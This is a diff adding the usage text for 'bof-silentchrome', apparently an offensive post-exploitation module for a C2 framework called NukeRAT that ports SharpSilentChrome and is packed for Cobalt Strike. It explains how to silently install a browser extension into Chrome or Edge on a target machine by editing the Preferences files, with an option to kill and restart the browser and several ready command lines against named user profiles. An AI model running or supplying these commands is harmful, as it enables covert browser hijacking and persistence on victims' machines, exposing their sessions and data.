@@ -1,0 +1,33 @@
+ABOUT
+    Silently installs or reverts a browser extension in Chrome or Edge by modifying
+    Preferences and Secure Preferences files. Port of SharpSilentChrome.
+
+USAGE:
+    bof-silentchrome --- <action> <browser> <sid> <profilepath> <extpath> <force> <backupext>
+
+    Packing matches Cobalt bof_pack("izzzziz") and armory slots 1-7.
+
+ARGUMENTS:
+    action       1 = install, 2 = revert
+    browser      chrome or msedge
+    sid          Target user SID; use "" for auto-detect (current user)
+    profilepath  User home (e.g. C:\Users\john) or full profile dir with \Default or \Profile
+    extpath      Unpacked extension directory on the target (must contain manifest.json)
+    force        0 = abort if browser is running; 1 = kill browser, act, restart session
+    backupext    Backup suffix for Preferences files; use backupssc or "" for default backupssc
+
+EXAMPLES:
+    bof-silentchrome -w 40 --- 1 chrome "" C:\Users\john C:\Windows\Temp\NukBenchExt 0 backupssc
+    bof-silentchrome -w 40 --- 1 msedge "" C:\Users\Iphit C:\Windows\Temp\NukBenchExt 1 backupssc
+    bof-silentchrome -w 40 --- 2 chrome "" C:\Users\john C:\Windows\Temp\NukBenchExt 1 backupssc
+
+NOTES:
+    Do not use force=1 from SYSTEM. Without force, changes apply on next browser start.
+    Revert removes the extension from live prefs; backupext must match install.
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-silentchrome -w 60 --- 1 chrome "" C:\Users\john C:\ext 0 backupssc
